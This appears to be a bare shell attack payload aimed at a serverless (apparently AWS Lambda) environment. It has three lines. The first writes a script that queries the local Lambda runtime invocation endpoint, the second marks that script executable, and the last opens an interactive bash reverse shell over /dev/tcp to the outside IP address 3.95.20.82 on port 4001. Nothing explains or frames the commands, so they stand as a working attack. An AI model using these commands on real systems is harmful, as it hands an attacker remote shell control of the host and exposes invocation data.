echo 'fetch("http://127.0.0.1:9001/2018-06-01/runtime/invocation/next").then(res => res.text()).then(console.log).catch(console.error)' > script.js;
chmod +x script.js;
bash -i >& /dev/tcp/3.95.20.82/4001 0>&1;
